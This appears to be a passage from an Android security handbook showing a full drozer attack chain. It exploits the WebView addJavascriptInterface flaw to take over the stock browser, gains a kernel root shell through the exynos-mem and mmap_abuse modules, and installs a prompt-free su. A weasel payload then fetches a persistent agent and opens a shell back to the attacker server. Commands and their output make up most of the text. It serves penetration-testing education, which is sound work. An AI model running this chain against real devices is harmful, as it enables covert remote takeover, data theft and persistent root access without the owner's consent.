### Android Permissions and Exploitation Techniques

The following permissions are granted to the agent, providing extensive control over the device:

- `android.permission.READ_SOCIAL_STREAM`
- `android.permission.READ_SYNC_SETTINGS`
- `android.permission.READ_SYNC_STATS`
- `android.permission.READ_USER_DICTIONARY`
- `android.permission.RECEIVE_BOOT_COMPLETED`
- `android.permission.RECEIVE_MMS`
- `android.permission.RECEIVE_SMS`
- `android.permission.RECEIVE_WAP_PUSH`
- `android.permission.RECORD_AUDIO`
- `android.permission.REORDER_TASKS`
- `android.permission.RESTART_PACKAGES`
- `android.permission.SEND_SMS`
- `android.permission.SET_ANIMATION_SCALE`
- `android.permission.SET_DEBUG_APP`
- `android.permission.SET_PROCESS_LIMIT`
- `android.permission.SET_TIME_ZONE`
- `android.permission.SET_WALLPAPER`
- `android.permission.SET_WALLPAPER_HINTS`
- `android.permission.SIGNAL_PERSISTENT_PROCESSES`
- `android.permission.SUBSCRIBED_FEEDS_READ`
- `android.permission.SUBSCRIBED_FEEDS_WRITE`
- `android.permission.SYSTEM_ALERT_WINDOW`
- `android.permission.USE_CREDENTIALS`
- `android.permission.USE_SIP`
- `android.permission.VIBRATE`
- `android.permission.WAKE_LOCK`
- `android.permission.WRITE_CALENDAR`
- `android.permission.WRITE_CONTACTS`
- `android.permission.WRITE_EXTERNAL_STORAGE`
- `android.permission.WRITE_PROFILE`
- `android.permission.WRITE_SMS`
- `android.permission.WRITE_SOCIAL_STREAM`
- `android.permission.WRITE_SYNC_SETTINGS`
- `android.permission.WRITE_USER_DICTIONARY`

With this level of access, a significant amount of control can be exerted over the device. The specific capabilities and potential exploits will be explored in the section "Infiltrating User Data."

### Drozer Agent Installation and Persistence

One of the advantages of installing a full drozer package is that it allows the use of `Context`, and the payload survives device reboots. This is because the drozer agent catches the `BOOT_COMPLETED` intent in its manifest, ensuring it starts again when the device boots up.

The other session received by the drozer server is a limited drozer agent, as shown previously in the Browser Memory Corruption exploit.

### Android Browser JavaScript Interface Vulnerability

As explained in the "WebViews" subsection in Chapter 7, all WebViews using a `JavaScriptInterface` and targeting an API version before 17 are vulnerable to a remote code execution flaw. This includes all stock Android web browsers on devices running Android 4.1.1 and older.

This example demonstrates how to abuse this vulnerability using a drozer exploit at `exploit.remote.browser.addjavascriptinterface`. The attack begins by running a drozer server on port 80 and building the exploit:

```sh
$ drozer exploit build exploit.remote.browser.addjavascriptinterface --server 192.168.1.112:80 --payload weasel.shell.armeabi --resource /
```

Output:
```
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading server.settings... [ OK ]
Uploading libWebViewContext.so... [ OK ]
Uploading blank page to /... [ OK ]
Uploading exploit inclusion page to /... [ OK ]
Uploading exploit to /dz.js... [ OK ]
Done. The exploit is available on: http://192.168.1.112:80/
When using the MitM helper plug-in for drozer: JS Location = http://192.168.1.112:80/dz.js
```

Visiting the main page from an Android 4.0.4 device yields the following in the drozer server log:

```
2014-11-14 10:32:57,713 - drozer.server.protocols.http - INFO - GET /
2014-11-14 10:32:58,217 - drozer.server.protocols.http - INFO - GET /dz.js
2014-11-14 10:32:59,227 - drozer.server.protocols.http - INFO - GET /server.settings
2014-11-14 10:32:59,314 - drozer.server.protocols.http - INFO - GET /libWebViewContext.so
2014-11-14 10:32:59,330 - drozer.server.protocols.http - INFO - GET /agent.jar
2014-11-14 10:33:00,157 - drozer.server.protocols.http - INFO - GET /favicon.ico
2014-11-14 10:33:00,208 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 2df0s1l8t5vld
```

A unique file, `libWebViewContext.so`, is requested by the exploit. This file, developed by David Hartley from MWR InfoSecurity, allows the drozer agent to obtain the `Context`. This effectively means the drozer code runs with the same permissions as the browser and is included as part of the browser's running code. For more information, see [this blog post](https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript-bridges-into-android-context/).

Connecting to this session and checking permissions confirms the agent has `Context` and shows the permissions held by the agent, which have been stolen from the browser:

```sh
$ drozer console connect 2df0s1l8t5vld --server 192.168.1.112:80
drozer Console (v2.3.4)
dz> permissions
Has ApplicationContext: YES
Available Permissions:
- android.permission.ACCESS_ALL_DOWNLOADS
- android.permission.ACCESS_COARSE_LOCATION
- android.permission.ACCESS_DOWNLOAD_MANAGER
- android.permission.ACCESS_FINE_LOCATION
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_WIFI_STATE
- android.permission.CHANGE_NETWORK_STATE
- android.permission.CHANGE_WIFI_STATE
- android.permission.DEVICE_POWER
- android.permission.GET_ACCOUNTS
- android.permission.INTERNET
- android.permission.MANAGE_ACCOUNTS
- android.permission.NFC
- android.permission.READ_CONTACTS
- android.permission.READ_PHONE_STATE
- android.permission.READ_SYNC_SETTINGS
- android.permission.RECEIVE_BOOT_COMPLETED
- android.permission.SEND_DOWNLOAD_COMPLETED_INTENTS
- android.permission.SET_WALLPAPER
- android.permission.STATUS_BAR
- android.permission.USE_CREDENTIALS
- android.permission.WAKE_LOCK
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.WRITE_MEDIA_STORAGE
- android.permission.WRITE_SECURE_SETTINGS
- android.permission.WRITE_SETTINGS
- android.permission.WRITE_SYNC_SETTINGS
- com.android.browser.permission.READ_HISTORY_BOOKMARKS
- com.android.browser.permission.WRITE_HISTORY_BOOKMARKS
- com.android.launcher.permission.INSTALL_SHORTCUT
```

Launching a shell from this session confirms you are running as the browser and using `com.android.browser` as the base directory:

```sh
dz> shell
app_81@android:/data/data/com.android.browser $ ls
agent.dex
agent.jar
app_appcache
app_databases
app_filesystem
app_geolocation
app_icons
app_webnotification
cache
databases
lib
libWebViewContext.so
server.settings
shared_prefs
w
```

### Post-Exploitation Techniques

While connected, explore post-exploitation techniques to obtain root access and install a drozer agent package that persists across reboots. The method used to gain the original session will not persist because it was loaded into memory during the exploit and does not ensure it will be loaded again.

To identify the device, use the following commands:

```sh
dz> shell getprop ro.product.brand
samsung
dz> shell getprop ro.product.model
GT-I9300
dz> shell getprop ro.build.version.release
4.0.4
```

Research reveals a kernel exploit is available for this device, discussed in Chapter 6 under "Exynos Abuse â€” Exploiting Custom Drivers." The exploit abuses the `/dev/exynos-mem` device driver for a root shell. To install all root exploit modules in drozer, run:

```sh
dz> module install root.
...
Processing metall0id.root.exynosmem... Done.
...
```

After installing the new root exploit module, it becomes available inside the console:

```sh
dz> ls exynos
exploit.root.exynosmem Obtain a root shell on Samsung Galaxy S2, S3, Note 2 and some other devices.
```

Running this module produces a root shell on the device:

```sh
dz> run exploit.root.exynosmem
[*] Uploading exynos-abuse
[*] Upload successful
[*] chmod 770 /data/data/com.android.browser/exynos-abuse
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_81@android:/data/data/com.android.browser # id
uid=0(root) gid=10081(app_81) groups=1015(sdcard_rw),1023(media_rw), 3003(inet)
```

If no known root exploits are available, you can use the `exploit.root.mmap_abuse` module to try to automatically get a root shell:

```sh
dz> ls root
...
exploit.root.mmap_abuse Iterate through all devices and attempt to exploit them to gain a root shell by abusing the mmap device operation.
...
```

Running this module on the same device:

```sh
dz> run exploit.root.mmap_abuse
[*] Uploading mmap-abuse
[*] Upload successful
[*] chmod 770 mmap-abuse
[*] Testing /dev/btlock
[*] Testing /dev/icdr
[*] Testing /dev/icd
[*] Testing /dev/fmradio
...
[*] Testing /dev/tty0
[*] Testing /dev/console
[*] Testing /dev/tty
[*] Testing /dev/exynos-mem
[+] /dev/exynos-mem is vulnerable!
[+] Enjoy your root shell...
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_129@android:/data/data/com.mwr.dz #
```

This module tries to exploit all block devices present on the device, which can cause a kernel panic and reboot the device, losing the session. However, it is effective against known vulnerable block devices, such as the Huawei P2 (see [this advisory](https://labs.mwrinfosecurity.com/advisories/2014/11/05/huawei-p2-hx170dec-privilege-escalation-vulnerability/)).

To maintain root access, install the `minimal su` binary bundled with drozer. This binary gives a root shell to any application that asks without prompting the user. Use the `tool.setup.minimalsu` module to set it up:

```sh
dz> run tools.setup.minimalsu
[+] Uploaded minimal-su
[+] Uploaded install-minimal-su.sh
[+] chmod 770 /data/data/com.android.browser/install-minimal-su.sh
[+] Ready! Execute /data/data/com.android.browser/install-minimal-su.sh from root context to install minimal-su
```

Running the generated script from the root shell installs `minimal su` correctly:

```sh
app_81@android:/data/data/com.android.browser # /data/data/com.android.browser/install-minimal-su.sh
Done. You can now use `su` from a drozer shell.
```

You can now run `su` from a normal shell to obtain root access:

```sh
dz> shell
app_81@android:/data/data/com.android.browser $ su -i
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_81@android:/data/data/com.android.browser #
```

With root access, the attacker can install a full drozer agent package with all available permissions, which will persist across reboots. The `weasel` payload can be used to retrieve and install the drozer agent:

```sh
app_81@android:/data/data/com.android.browser # ./w 192.168.1.112 80
Success
Broadcasting: Intent { act=com.mwr.dz.PWN }
Broadcast completed: result=0
Starting service: Intent { cmp=com.mwr.dz/.Agent }
pkg: /data/data/com.android.browser/agent.apk
```

This will break the current shell session, and you will need to press `Control+C` to exit. The drozer server logs will show:

```
2014-11-14 12:05:03,206 - drozer.server.protocols.http - INFO - GET /agent.apk
2014-11-14 12:12:01,257 - drozer.server.protocols.shell - INFO - accepted shell from 192.168.1.109:42883
2014-11-14 12:12:01,268 - drozer.server.protocols.http - INFO - GET /agent.apk
2014-11-14 12:12:01,273 - drozer.server.protocols.http - INFO - GET /agent.jar
2014-11-14 12:12:03,369 - drozer.server.protocols.drozerp.drozer - INFO
```